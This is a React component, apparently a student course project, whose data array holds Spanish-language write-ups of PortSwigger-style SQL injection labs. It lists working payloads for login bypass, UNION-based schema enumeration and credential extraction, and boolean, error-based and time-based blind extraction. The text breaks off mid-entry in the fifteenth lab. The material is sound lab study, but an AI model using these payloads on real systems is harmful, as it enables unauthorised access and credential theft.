import React, { useState } from 'react';
import { FaServer, FaTerminal, FaCode, FaCheckCircle, FaExclamationTriangle, FaBug, FaDatabase, FaShieldAlt, FaEyeSlash, FaClock, FaWifi, FaBolt, FaChevronRight } from 'react-icons/fa';
import { motion, AnimatePresence } from 'framer-motion';

const labsData = [
    {
        id: 1,
        title: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",
        type: "In-band",
        level: "Apprentice",
        payload: "' OR 1=1--",
        description: "Bypass del filtro WHERE con operador tautológico para revelar productos ocultos del catálogo.",
        objective: "Explotar un parámetro GET vulnerable en el filtro de categorías para recuperar todos los artículos de la base de datos, incluyendo aquellos marcados como 'no publicados'.",
        analysis: "La aplicación construye la consulta SQL directamente concatenando el parámetro de URL category sin sanitización. Al inyectar ' OR 1=1--, la condición original se rompe y la cláusula OR 1=1 siempre evalúa como verdadero, haciendo que la base de datos devuelva todas las filas.",
        impact: "Un atacante puede ver todos los registros de la base de datos incluyendo contenido oculto. En entornos productivos, esto podría exponer precios internos, productos en desarrollo, datos de clientes o información confidencial del negocio.",
        steps: [
            {
                title: "Reconocimiento del Endpoint",
                text: "Se accede a la tienda y se navega por las categorías de productos. En la URL se observa el parámetro ?category=Gifts. Este parámetro es directamente insertado en la consulta SQL del backend.",
                code: "GET /filter?category=Gifts HTTP/1.1"
            },
            {
                title: "Intercepción con Burp Suite",
                text: "Se intercepta la petición mediante el Proxy de Burp Suite y se envía al módulo Repeater para poder modificarla y reenviarla de forma controlada.",
                code: ""
            },
            {
                title: "Inyección del Payload Tautológico",
                text: "Se modifica el parámetro category inyectando el payload. El apóstrofe (') cierra la cadena del valor original, OR 1=1 fuerza la condición siempre verdadera, y -- comenta el resto de la consulta SQL.",
                code: "' OR 1=1--"
            },
            {
                title: "Resultado",
                text: "El servidor responde con HTTP 200 OK mostrando todos los productos de la base de datos, incluyendo los marcados como released=0 (no publicados). El laboratorio queda resuelto al listar el catálogo completo.",
                code: "SELECT * FROM products WHERE category = '' OR 1=1--' AND released=1"
            }
        ],
        images: [
            "parcial2/act08_images/P3_img22.png",
        ]
    },
    {
        id: 2,
        title: "SQL injection vulnerability allowing login bypass",
        type: "In-band",
        level: "Apprentice",
        payload: "administrator'--",
        description: "Evasión del sistema de autenticación inyectando en el campo de usuario para omitir la validación de contraseña.",
        objective: "Iniciar sesión como el usuario administrator sin conocer su contraseña, explotando el campo username del formulario de inicio de sesión.",
        analysis: "La consulta de autenticación es: SELECT * FROM users WHERE username='[input]' AND password='[input]'. Al inyectar administrator'--, el apóstrofe cierra el string del username, los guiones -- comentan la parte de la contraseña, haciendo que la base de datos válide solo el nombre de usuario.",
        impact: "Acceso administrativo total al sistema sin credenciales. Un atacante podría comprometer la totalidad de la aplicación, sus datos y sus usuarios al obtener el panel de administración.",
        steps: [
            {
                title: "Identificación del Vector",
                text: "El formulario de login tiene dos campos: username y password. La aplicación construye una consulta SQL concatenando ambos valores directamente sin usar consultas preparadas.",
                code: ""
            },
            {
                title: "Craft del Payload",
                text: "En el campo de usuario se introduce el payload. El apóstrofe cierra el string del username, los dobles guiones comentan todo lo que sigue, incluyendo la verificación de la contraseña.",
                code: "administrator'--"
            },
            {
                title: "Resultado",
                text: "La base de datos ejecuta la consulta sin verificar la contraseña. El servidor redirige a /my-account?id=administrator, indicando inicio de sesión exitoso como administrador. El laboratorio queda resuelto.",
                code: "SELECT * FROM users WHERE username='administrator'--' AND password=''"
            }
        ],
        images: [
            "parcial2/act08_images/P3_img22.png",
            "parcial2/act08_images/P5_img27.png",
            "parcial2/act08_images/P5_img28.png",
        ]
    },
    {
        id: 3,
        title: "SQL injection attack, querying the database type and version on Oracle",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' UNION SELECT BANNER, NULL FROM v$version--",
        description: "Fingerprinting de la base de datos Oracle mediante UNION para exfiltrar la firma de banner del servidor.",
        objective: "Determinar el tipo y versión exacta de la base de datos Oracle que sostiene la aplicación, explotando el filtro de categorías con una inyección UNION.",
        analysis: "En Oracle, cada SELECT debe incluir una cláusula FROM. Se usa la tabla dual del sistema para consultas de prueba. La vista v$version contiene el banner con información de versión. El ataque requiere primero determinar el número de columnas y luego exfiltrar la versión.",
        impact: "Conocer la versión exacta del motor de base de datos permite al atacante buscar exploits y CVEs específicos. Es el primer paso de un proceso de reconocimiento técnico orientado a comprometer completamente el servidor.",
        steps: [
            {
                title: "Determinación del número de columnas",
                text: "Se comienza determinando cuántas columnas retorna la consulta original. Se inyectan payloads con ORDER BY de forma incremental hasta obtener un error.",
                code: "' ORDER BY 1-- (OK) → ' ORDER BY 2-- (OK) → ' ORDER BY 3-- (ERROR)"
            },
            {
                title: "Confirmación de columnas con UNION",
                text: "Con 2 columnas confirmado, se prueba cuáles aceptan datos de tipo string usando NULL y valores de texto, necesario para mostrar la versión en pantalla.",
                code: "' UNION SELECT NULL, NULL FROM dual--"
            },
            {
                title: "Exfiltración de la versión",
                text: "Se consulta la vista del sistema v$version que contiene el banner de Oracle con la versión. La segunda columna con NULL rellena la segunda columna requerida.",
                code: "' UNION SELECT BANNER, NULL FROM v$version--"
            },
            {
                title: "Resultado",
                text: "La página muestra el banner completo de Oracle en los resultados de la categoría: 'Oracle Database 11g Enterprise Edition Release...'. El laboratorio queda resuelto al exponer la versión del motor.",
                code: "HTTP/1.1 200 OK → Oracle Database 11g Enterprise Edition..."
            }
        ],
        images: [
            "parcial2/act08_images/P5_img27.png",
            "parcial2/act08_images/P5_img28.png",
            "parcial2/act08_images/P6_img31.png",
            "parcial2/act08_images/P6_img32.png",
        ]
    },
    {
        id: 4,
        title: "SQL injection attack, querying database type and version on MySQL and Microsoft",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' UNION SELECT @@version, NULL#",
        description: "Fingerprinting de versión en MySQL/MSSQL usando la variable global @@version con comentario tipo hash.",
        objective: "Obtener la versión del motor de base de datos MySQL o Microsoft SQL Server explotando el parámetro de filtro de categorías con una inyección UNION.",
        analysis: "La sintaxis de comentarios difiere entre bases de datos: MySQL acepta # y --+, mientras que Oracle requiere --. La variable @@version es global en MySQL/MSSQL y contiene la cadena completa de versión. El carácter # comenta el resto de la consulta original.",
        impact: "La fingerprinting de versión permite a los atacantes localizar vulnerabilidades específicas del motor, exploits publicados en NVD/CVE y configuraciones predeterminadas inseguras, preparando una cadena de ataque más sofisticada.",
        steps: [
            {
                title: "Prueba del delimitador de comentario",
                text: "A diferencia de Oracle, MySQL acepta # como delimitador de comentario. Se prueba primero la sintaxis de comentario correcta para el motor objetivo.",
                code: "' ORDER BY 1#  (MySQL comment syntax)"
            },
            {
                title: "Confirmación de columnas",
                text: "Se incrementa el ORDER BY hasta encontrar error, confirmando que la consulta retorna 2 columnas. Luego se verifica qué columna acepta texto para la exfiltración.",
                code: "' UNION SELECT NULL, NULL#"
            },
            {
                title: "Exfiltración con @@version",
                text: "Se usa la variable global @@version disponible en MySQL y MSSQL. Esta variable almacena automáticamente la cadena completa de versión del motor en tiempo de ejecución.",
                code: "' UNION SELECT @@version, NULL#"
            },
            {
                title: "Resultado",
                text: "La respuesta incluye la cadena de versión completa del motor. Ejemplo: '8.0.27-MySQL Community Server' o 'Microsoft SQL Server 2019 (RTM)...'. Laboratorio resuelto.",
                code: "HTTP/1.1 200 OK → 8.0.27-MySQL Community Server-GPL"
            }
        ],
        images: [
            "parcial2/act08_images/P5_img27.png",
            "parcial2/act08_images/P5_img28.png",
            "parcial2/act08_images/P6_img31.png",
            "parcial2/act08_images/P6_img32.png",
        ]
    },
    {
        id: 5,
        title: "SQL injection attack, listing the database contents on non-Oracle",
        type: "UNION-based",
        level: "Practitioner",
        payload: "' UNION SELECT table_name, NULL FROM information_schema.tables--",
        description: "Enumeración completa del esquema de base de datos vía information_schema para localizar la tabla de credenciales.",
        objective: "Listar todas las tablas de la base de datos usando information_schema, encontrar la tabla de usuarios, extraer sus columnas y finalmente obtener las credenciales del administrador.",
        analysis: "El estándar SQL ANSI define information_schema como un catálogo de metadatos disponible en MySQL, PostgreSQL y MSSQL. La tabla information_schema.tables contiene el nombre de todas las tablas, y information_schema.columns contiene todos los nombres de columnas, permitiendo una enumeración completa y estructurada del esquema.",
        impact: "La enumeración del esquema completo expone la arquitectura completa de la base de datos: nombres de tablas, columnas, tipos de datos. Con esta información, un atacante puede ubicar y exfiltrar cualquier dato almacenado en la aplicación.",
        steps: [
            {
                title: "Enumeración de tablas",
                text: "Se utiliza information_schema.tables para listar todas las tablas. Se filtra por table_schema para evitar ruido de tablas del sistema como sys, mysql, information_schema.",
                code: "' UNION SELECT table_name, NULL FROM information_schema.tables--"
            },
            {
                title: "Localización de la tabla de usuarios",
                text: "Entre los resultados aparece una tabla con nombre aleatorio tipo 'users_abcxyz'. Se anota el nombre exacto para la siguiente consulta de columnas.",
                code: "'Tabla detectada: users_abcxyz'"
            },
            {
                title: "Enumeración de columnas de la tabla objetivo",
                text: "Se consulta information_schema.columns filtrando por el nombre de la tabla encontrada para conocer exactamente qué columnas tiene.",
                code: "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcxyz'--"
            },
            {
                title: "Extracción de credenciales",
                text: "Con los nombres de columna exactos (username y password), se hace la extracción final de credenciales. Se inicia sesión con la contraseña del administrador.",
                code: "' UNION SELECT username, password FROM users_abcxyz--"
            }
        ],
        images: [
            "parcial2/act08_images/P6_img31.png",
            "parcial2/act08_images/P6_img32.png",
            "parcial2/act08_images/P7_img35.png",
            "parcial2/act08_images/P7_img36.png",
        ]
    },
    {
        id: 6,
        title: "SQL injection attack, listing the database contents on Oracle",
        type: "UNION-based",
        level: "Practitioner",
        payload: "' UNION SELECT table_name, NULL FROM all_tables--",
        description: "Enumeración del esquema en Oracle usando el diccionario interno all_tables y all_tab_columns en lugar del estándar information_schema.",
        objective: "Listar las tablas de una base de datos Oracle, localizar la tabla de usuarios, enumerar sus columnas y extraer las credenciales del administrador para iniciar sesión.",
        analysis: "Oracle no implementa information_schema. En su lugar usa vistas del sistema DBA: all_tables para ver todas las tablas accesibles, all_tab_columns para columnas por tabla. Además, Oracle maneja nombres de objetos en MAYÚSCULAS por convención.",
        impact: "Misma criticidad que en sistemas no-Oracle: exposición completa del esquema de datos. El conocimiento de las vistas propietarias de Oracle (all_tables, dba_users) amplía el vector de ataque para acceder a información privilegiada del servidor.",
        steps: [
            {
                title: "Enumeración de tablas en Oracle",
                text: "En Oracle no existe information_schema. Se usa la vista del sistema all_tables que contiene los nombres de todas las tablas accesibles por el usuario actual de la base de datos.",
                code: "' UNION SELECT table_name, NULL FROM all_tables--"
            },
            {
                title: "Localización de la tabla de usuarios",
                text: "La respuesta incluye una larga lista de tablas. Se identifica la tabla de usuarios por su nombre (generalmente en mayúsculas): USERS_GGYPYC.",
                code: "'Tabla encontrada: USERS_GGYPYC'"
            },
            {
                title: "Enumeración de columnas con all_tab_columns",
                text: "Se consulta all_tab_columns filtrando por la tabla encontrada para obtener los nombres exactos de columna (también en MAYÚSCULAS).",
                code: "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_GGYPYC'--"
            },
            {
                title: "Extracción y acceso",
                text: "Con los nombres de columna exactos USERNAME_OCIROF y PASSWORD_CAPDCE, se extrae las credenciales del administrador y se inicia sesión para resolver el laboratorio.",
                code: "' UNION SELECT USERNAME_OCIROF, PASSWORD_CAPDCE FROM USERS_GGYPYC--"
            }
        ],
        images: [
            "parcial2/act08_images/P7_img35.png",
            "parcial2/act08_images/P7_img36.png",
            "parcial2/act08_images/P7_img37.png",
            "parcial2/act08_images/P9_img42.png",
        ]
    },
    {
        id: 7,
        title: "SQL injection UNION attack, determining the number of columns",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' ORDER BY 3--",
        description: "Fase de footprinting para ataques UNION: determinación precisa del número de columnas que retorna la consulta original.",
        objective: "Descubrir cuántas columnas retorna la consulta del filtro de categorías, paso previo obligatorio para ejecutar cualquier ataque UNION-based exitoso.",
        analysis: "Un UNION SELECT solo funciona si ambas consultas retornan el mismo número de columnas. Existen dos técnicas: ORDER BY incremental (provoca error al superar el número de columnas) y UNION SELECT NULL incremental (agrega columnas hasta que la consulta es válida). ORDER BY es más silencioso ya que no altera la respuesta visible.",
        impact: "Aunque no extrae datos directamente, este paso es el fundamento de cualquier ataque UNION. Sin él, todos los ataques posteriores fallarán. Demuestra que el parámetro es inyectable y da información estructural crítica de la consulta backend.",
        steps: [
            {
                title: "Técnica ORDER BY incremental",
                text: "Se inyecta ORDER BY con valores crecientes. Mientras el número sea menor o igual al número de columnas, la página carga normal. Cuando supera el límite, la base de datos retorna un error o la página se muestra diferente.",
                code: "' ORDER BY 1--  →  ' ORDER BY 2--  →  ' ORDER BY 3-- (ERROR)"
            },
            {
                title: "Confirmación con UNION SELECT NULL",
                text: "Se confirma el conteo añadiendo columnas NULL hasta que la consulta sea válida. Cada NULL representa una columna. Al cargar correctamente, el conteo es exacto.",
                code: "' UNION SELECT NULL, NULL, NULL--"
            },
            {
                title: "Identificación de columnas con texto",
                text: "Se reemplaza cada NULL por una cadena de texto para determinar qué posición acepta datos de tipo string (necesario para exfiltrar datos legibles).",
                code: "' UNION SELECT 'a', NULL, NULL--  (probar cada posición)"
            },
            {
                title: "Resultado",
                text: "Se confirma que la consulta retorna 3 columnas y que la primera acepta datos de tipo string. Esta información es suficiente para proceder con ataques UNION de exfiltración de datos.",
                code: "HTTP/1.1 200 OK → Laboratorio resuelto con 3 columnas confirmadas"
            }
        ],
        images: [
            "parcial2/act08_images/P10_img46.png",
            "parcial2/act08_images/P10_img47.png",
            "parcial2/act08_images/P9_img42.png",
            "parcial2/act08_images/P9_img43.png",
        ]
    },
    {
        id: 8,
        title: "SQL injection UNION attack, finding a column containing text",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' UNION SELECT 'a', NULL--",
        description: "Identificación de qué columnas del resultado son de tipo texto para poder exfiltrar datos legibles mediante UNION.",
        objective: "Determinar cuál de las columnas retornadas por la consulta original acepta datos de tipo string, para usarla como canal de exfiltración de datos en ataques UNION.",
        analysis: "Una base de datos requiere compatibilidad de tipos en los UNION. Si intentamos colocar una cadena en una columna de tipo entero o fecha, se producirá un error de conversión de tipos. Al probar cada posición con 'a' se identifica exactamente qué posiciones son compatibles con strings.",
        impact: "Sin identificar las columnas de tipo texto, la exfiltración de datos mediante UNION es imposible. Este paso permite al atacante usar la columna correcta como canal de salida para mostrar contraseñas, emails u otros datos sensibles en la respuesta HTTP.",
        steps: [
            {
                title: "Establecer la línea base",
                text: "Con el número de columnas ya conocido (3 en este caso), se parte de un UNION SELECT con todos NULLs válido como punto de partida.",
                code: "' UNION SELECT NULL, NULL, NULL--"
            },
            {
                title: "Probar primera posición",
                text: "Se reemplaza el primer NULL por la cadena 'a'. Si la página carga sin error, la primera columna acepta strings. Si hay error de tipos, se prueba la siguiente.",
                code: "' UNION SELECT 'a', NULL, NULL--"
            },
            {
                title: "Probar segunda posición",
                text: "Si la primera falla, se mueve la cadena a la segunda posición. Se repite hasta encontrar la columna compatible con strings.",
                code: "' UNION SELECT NULL, 'a', NULL--"
            },
            {
                title: "Resultado",
                text: "Al cargar correctamente con 'a' en una posición específica, se confirma que esa columna es de tipo texto. Ahora podemos reemplazar 'a' por cualquier dato a exfiltrar en ataques subsecuentes.",
                code: "HTTP/1.1 200 OK → Columna de tipo string identificada"
            }
        ],
        images: [
            "parcial2/act08_images/P10_img47.png",
            "parcial2/act08_images/P11_img49.png",
            "parcial2/act08_images/P11_img50.png",
            "parcial2/act08_images/P11_img51.png",
        ]
    },
    {
        id: 9,
        title: "SQL injection UNION attack, retrieving data from other tables",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' UNION SELECT username, password FROM users--",
        description: "Exfiltración directa de credenciales desde la tabla users utilizando un ataque UNION completamente articulado.",
        objective: "Extraer todos los usuarios y contraseñas de la tabla users, localizar las credenciales del administrador e iniciar sesión.",
        analysis: "Este laboratorio combina los pasos previos: se asume que la consulta retorna 2 columnas de tipo string, ambas visibles en pantalla. El ataque UNION une directamente nuestra consulta a la original, haciendo que el servidor retorne los datos de la tabla users junto con los productos regulares.",
        impact: "Extracción masiva de credenciales de todos los usuarios del sistema. Con las contraseñas en texto plano o hasheadas (dependiendo del sistema), el atacante puede comprometer todas las cuentas, incluyendo la administrativa.",
        steps: [
            {
                title: "Verificación del entorno",
                text: "Se confirma que la consulta retorna 2 columnas y que ambas son de tipo string. Esto significa que podemos exfiltrar dos campos simultáneamente en una sola consulta UNION.",
                code: "' UNION SELECT 'a', 'b'--"
            },
            {
                title: "Exfiltración de credenciales",
                text: "Se construye el payload final dirigido directamente a la tabla users. Los campos username y password se mapean a las dos columnas visibles de la respuesta.",
                code: "' UNION SELECT username, password FROM users--"
            },
            {
                title: "Identificación del administrador",
                text: "La respuesta muestra todos los pares usuario-contraseña de la tabla. Se identifica el registro con username='administrator' y se copia su contraseña.",
                code: "administrator / s3cr3tPassw0rd"
            },
            {
                title: "Acceso y resolución",
                text: "Se navega al panel de login y se inicia sesión con las credenciales extraídas. El sistema autentica correctamente y el laboratorio queda resuelto.",
                code: "HTTP/1.1 302 Found → Location: /my-account?id=administrator"
            }
        ],
        images: [
            "parcial2/act08_images/P11_img49.png",
            "parcial2/act08_images/P11_img50.png",
            "parcial2/act08_images/P12_img53.png",
            "parcial2/act08_images/P12_img54.png",
        ]
    },
    {
        id: 10,
        title: "SQL injection UNION attack, retrieving multiple values in a single column",
        type: "UNION-based",
        level: "Practitioner",
        payload: "' UNION SELECT NULL, username||'~'||password FROM users--",
        description: "Concatenación de múltiples campos en una sola columna para exfiltrar varios valores cuando solo una columna string está disponible.",
        objective: "Extraer usernames y contraseñas en una sola columna de tipo string usando concatenación SQL, cuando la consulta solo expone una columna compatible con texto.",
        analysis: "Cuando solo una columna acepta strings, no podemos exfiltrar username y password por separado en el mismo UNION. La solución es concatenarlos en un solo campo usando el operador || en Oracle/PostgreSQL o CONCAT() en MySQL. Se usa un delimitador único (como ~) para separar los valores al leerlos.",
        impact: "Técnica que permite superar la limitación de columnas disponibles, demostrando la flexibilidad de los ataques UNION. Aunque solo haya una columna de texto visible, el atacante puede exfiltrar múltiples campos concatenados.",
        steps: [
            {
                title: "Identificación de la columna disponible",
                text: "La consulta retorna 2 columnas pero solo la segunda acepta strings. La primera es numérica. Se confirma con NULL en la primera posición y 'a' en la segunda.",
                code: "' UNION SELECT NULL, 'a'--"
            },
            {
                title: "Concatenación con operador ||",
                text: "Se construye la concatenación usando el operador || de PostgreSQL. Se incluye un separador ~ para distinguir el username de la contraseña al leer el resultado.",
                code: "' UNION SELECT NULL, username||'~'||password FROM users--"
            },
            {
                title: "Lectura del resultado concatenado",
                text: "La respuesta muestra cadenas del tipo 'administrator~s3cr3t'. Se separa por el delimitador ~ para obtener el par usuario-contraseña limpio.",
                code: "administrator~s3cr3tpass  →  admin : s3cr3tpass"
            },
            {
                title: "Acceso",
                text: "Se usa la contraseña extraída para iniciar sesión como administrador. El laboratorio queda resuelto al acceder exitosamente a la cuenta.",
                code: "HTTP/1.1 302 Found → /my-account?id=administrator"
            }
        ],
        images: [
            "parcial2/act08_images/P12_img53.png",
            "parcial2/act08_images/P12_img54.png",
            "parcial2/act08_images/P13_img57.png",
            "parcial2/act08_images/P13_img58.png",
        ]
    },
    {
        id: 11,
        title: "Blind SQL injection with conditional responses",
        type: "Blind",
        level: "Practitioner",
        payload: "' AND '1'='1",
        description: "Exfiltración de datos carácter a carácter mediante inyección ciega booleana observando cambios en el mensaje 'Welcome Back'.",
        objective: "Determinar la contraseña del administrador carácter a carácter explotando una inyección SQL ciega basada en respuestas condicionales booleanas en la cookie TrackingId.",
        analysis: "La aplicación no muestra resultados SQL pero sí muestra el mensaje 'Welcome Back' cuando la condición es verdadera. Esto permite construir preguntas booleanas: ¿el primer carácter de la contraseña es 'a'? Si es sí → aparece el mensaje. Se automatiza con Burp Intruder o scripts Python para extraer cada carácter.",
        impact: "Aunque más lento que ataques UNION, la inyección ciega booleana es completamente funcional para extraer cualquier dato de la base de datos. La automatización con Burp Intruder puede obtener contraseñas de 20 caracteres en minutos.",
        steps: [
            {
                title: "Confirmación de la inyección ciega",
                text: "Se modifica el valor de la cookie TrackingId inyectando condiciones booleanas. Si la condición es verdadera (1=1), aparece 'Welcome Back'. Si es falsa (1=2), desaparece.",
                code: "TrackingId=xyz' AND '1'='1  → Welcome Back visible"
            },
            {
                title: "Confirmación de existencia del usuario",
                text: "Se verifica que el usuario administrator existe en la tabla users usando una subconsulta booleana.",
                code: "TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--"
            },
            {
                title: "Determinación de la longitud de la contraseña",
                text: "Se usa LENGTH() para determinar cuántos caracteres tiene la contraseña. Se incrementa el valor hasta que 'Welcome Back' desaparece.",
                code: "TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a'--"
            },
            {
                title: "Extracción carácter a carácter",
                text: "Con SUBSTRING(), se extrae cada carácter de la contraseña probando cada posible valor. Burp Intruder automatiza este proceso con el conjunto de caracteres [a-z0-9].",
                code: "TrackingId=xyz' AND SUBSTRING(password,1,1)='a'--  (iterar por posición y carácter)"
            }
        ],
        images: [
            "parcial2/act08_images/P13_img57.png",
            "parcial2/act08_images/P13_img58.png",
            "parcial2/act08_images/P14_img61.png",
            "parcial2/act08_images/P14_img62.png",
        ]
    },
    {
        id: 12,
        title: "Blind SQL injection with conditional errors",
        type: "Blind",
        level: "Practitioner",
        payload: "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END FROM dual)='a",
        description: "Exfiltración mediante inyección ciega basada en errores condicionales cuando no existe diferencia en la respuesta booleana.",
        objective: "Extraer la contraseña del usuario administrator usando inyección ciega basada en errores: la base de datos genera un error solo cuando la condición es verdadera.",
        analysis: "Cuando la aplicación no muestra diferencia visual según la condición booleana, se recurre a error-based blind SQLi. La técnica usa CASE WHEN: si la condición es verdadera, ejecuta 1/0 (división por cero = error HTTP 500). Si es falsa, retorna una cadena válida (respuesta 200). El código HTTP actúa como oráculo.",
        impact: "Aplicable en escenarios donde la aplicación maneja respuestas idénticas para condiciones verdaderas/falsas, pero sí diferencia entre errores del servidor (500) y respuestas exitosas (200). Extiende enormemente el alcance de los ataques ciegos.",
        steps: [
            {
                title: "Verificación de error condicional",
                text: "Se confirma que se puede provocar un error a voluntad. Con CASE WHEN 1=1 se ejecuta 1/0 (error). Con CASE WHEN 1=2 no hay error.",
                code: "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END FROM dual)='a"
            },
            {
                title: "Verificación de existencia del usuario",
                text: "Se sustituye la condición 1=1 por la verificación de que administrator existe como usuario. Un HTTP 500 confirma que sí existe.",
                code: "' AND (SELECT CASE WHEN (username='administrator') THEN 1/0 ELSE 'a' END FROM users)='a"
            },
            {
                title: "Extracción de la contraseña",
                text: "Se construye el payload para extraer cada carácter de la contraseña. Un error 500 indica que el carácter en esa posición coincide con el valor probado.",
                code: "' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a"
            },
            {
                title: "Automatización con Burp Intruder",
                text: "Se automatizan las 20 posiciones × el conjunto de caracteres con Burp Intruder en modo Cluster Bomb. Las respuestas HTTP 500 marcan el carácter correcto en cada posición.",
                code: "HTTP 500 → carácter correcto detectado / HTTP 200 → incorrecto, continuar"
            }
        ],
        images: [
            "parcial2/act08_images/P14_img61.png",
            "parcial2/act08_images/P14_img62.png",
            "parcial2/act08_images/P15_img65.png",
            "parcial2/act08_images/P15_img66.png",
        ]
    },
    {
        id: 13,
        title: "Visible error-based SQL injection",
        type: "Error-based",
        level: "Practitioner",
        payload: "' AND CAST((SELECT password FROM users LIMIT 1) AS int)--",
        description: "Exfiltración de datos mediante mensajes de error detallados del servidor que incluyen el valor del dato en el mensaje de conversión de tipos.",
        objective: "Obtener la contraseña del administrador haciendo que el servidor incluya el valor de la contraseña directamente en el mensaje de error visible de la respuesta HTTP.",
        analysis: "Algunos servidores de base de datos retornan mensajes de error muy detallados cuando se produce un fallo de conversión de tipos. Al intentar convertir (CAST) un string a integer, el error incluye el valor del string original: 'invalid input syntax for type integer: password_value'. El dato queda expuesto en el mensaje de error.",
        impact: "Mucho más eficiente que la inyección ciega: se obtiene el dato completo en una sola petición en lugar de carácter a carácter. En producción, estos errores detallados son un fallo grave de configuración (verbose error messages) que debe estar deshabilitado.",
        steps: [
            {
                title: "Provocar un error de conversión de tipos",
                text: "Se inyecta en la cookie TrackingId un CAST que intenta convertir un string a integer. La base de datos falla e incluye el valor del string en el mensaje de error.",
                code: "TrackingId=xyz' AND CAST((SELECT 1) AS int)--"
            },
            {
                title: "Extracción del username",
                text: "Se dirige el CAST hacia el campo username de la tabla users. El error del servidor mostrará el nombre de usuario en el mensaje.",
                code: "TrackingId=xyz' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
            },
            {
                title: "Extracción de la contraseña",
                text: "Una vez confirmado el usuario, se extrae la contraseña de la misma forma. El error de conversión expone la contraseña en texto plano en la respuesta.",
                code: "TrackingId=xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
            },
            {
                title: "Acceso",
                text: "La contraseña queda expuesta en el mensaje de error: 'invalid input syntax for type integer: s3cr3tpass'. Se usa para iniciar sesión como administrador.",
                code: "HTTP 500 → ERROR: invalid input syntax for type integer: 'adminpassword'"
            }
        ],
        images: [
            "parcial2/act08_images/P15_img65.png",
            "parcial2/act08_images/P15_img66.png",
            "parcial2/act08_images/P16_img69.png",
            "parcial2/act08_images/P16_img70.png",
        ]
    },
    {
        id: 14,
        title: "Blind SQL injection with time delays",
        type: "Blind (Time)",
        level: "Practitioner",
        payload: "'; IF (1=1) WAITFOR DELAY '0:0:10'--",
        description: "Confirmación de inyección ciega mediante delays temporales cuando no existe ninguna diferencia observable en la respuesta HTTP.",
        objective: "Verificar la existencia de una vulnerabilidad SQLi ciega en la cookie TrackingId provocando un retraso deliberado en la respuesta del servidor usando funciones de tiempo.",
        analysis: "Cuando la aplicación procesa la cookie de forma asíncrona y nunca retorna diferencias en su respuesta, se recurre a time-based blind SQLi. Las funciones pg_sleep() (PostgreSQL), WAITFOR DELAY (MSSQL) o SLEEP() (MySQL) detienen la ejecución de la query un tiempo determinado. Si la respuesta tarda ese tiempo, el canal de inyección está confirmado.",
        impact: "Confirma existencia de inyección incluso en aplicaciones completamente 'silenciosas'. Sirve como prueba forense de vulnerabilidad aunque no extraiga datos directamente. La técnica es fácilmente detectable por sistemas IDS que monitorean latencias anómalas.",
        steps: [
            {
                title: "Prueba con condición siempre verdadera",
                text: "Se inyecta una condición verdadera que activa el delay. Si la respuesta del servidor tarda exactamente 10 segundos, el canal de inyección está confirmado.",
                code: "TrackingId=xyz'; SELECT pg_sleep(10)--"
            },
            {
                title: "Confirmación con condición específica",
                text: "Se combina el delay con una condición de datos: si administrator existe, el servidor tardará 10s. Si no existe, responde inmediatamente.",
                code: "TrackingId=xyz'; IF (SELECT COUNT(*) FROM users WHERE username='administrator')=1 WAITFOR DELAY '0:0:10'--"
            },
            {
                title: "Observación del timing",
                text: "En Burp Suite Repeater se observa la columna de tiempo de respuesta. Una respuesta de ~10,000ms confirma que la condición fue verdadera y que el canal de inyección funciona.",
                code: "Tiempo de respuesta: 10,127ms → Condición TRUE confirmada"
            },
            {
                title: "Resultado",
                text: "La inyección ciega basada en tiempo queda confirmada. Este resultado establece la base para ataques de extracción de datos carácter a carácter usando timing como oráculo.",
                code: "HTTP/1.1 200 OK (después de 10s) → Blind SQL Injection por tiempo confirmada"
            }
        ],
        images: [
            "parcial2/act08_images/P16_img69.png",
            "parcial2/act08_images/P16_img70.png",
            "parcial2/act08_images/P17_img73.png",
            "parcial2/act08_images/P17_img74.png",
        ]
    },
    {
        id: 15,
        title: "Blind SQL injection with time delays and information retrieval",
        type: "Blind (Time)",
        level: "Practitioner",
        payload: "'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--",
        description: "Extracción completa de contraseña carácter a carácter usando el tiempo de respuesta del servidor como único canal de comunicación.",
        objective: "Extraer la contraseña del administrador carácter a carácter usando delays condicionales como oráculo, automatizado con Burp Intruder.",
        analysis: "Se combina el delay condicional con SUBSTRING() para preguntar sobre cada carácter de la contraseña. Un delay de 10s = carácter correcto, respuesta inmediata = carácter incorrecto. Con 20 posiciones y [a-z0-9] son ~720 peticiones automatizables con Burp Intruder Cluster Bomb.",
        impact: "Permite extraer datos completos de una base de datos incluso cuando la aplicación es completamente opaca en sus respuestas. La única defensa relevante es la eliminación de la vulnerabilidad en el código fuente, ya que el canal de timing siempre estará disponible.",
        steps: [
            {
                title: "Determinación de longitud de contraseña",
                text: "Se estructura el payload condicional para determinar la longitud. Si la longitud es mayor que N, el servidor espera 10 segundos. Se itera N hasta que la respuesta es inmediata.",
                code: "'; SELECT CASE WHEN (LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
            },
            {
                title: "Extracción carácter a carácter",
                text: "Se construye el payload para evaluar cada posición. SUBSTRING(password,POS,1) extrae el carácter en la posición POS y lo compara con cada carácter del conjunto.",
                code: "'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
            },
            {
                title: "Automatización con Burp Intruder",
                text: "Se configura Burp Intruder en modo Cluster Bomb con dos payloads: posición (1-20) y carácter (a-z, 0-9). Se aplica un grep de tiempo de respuesta para identificar hits.",
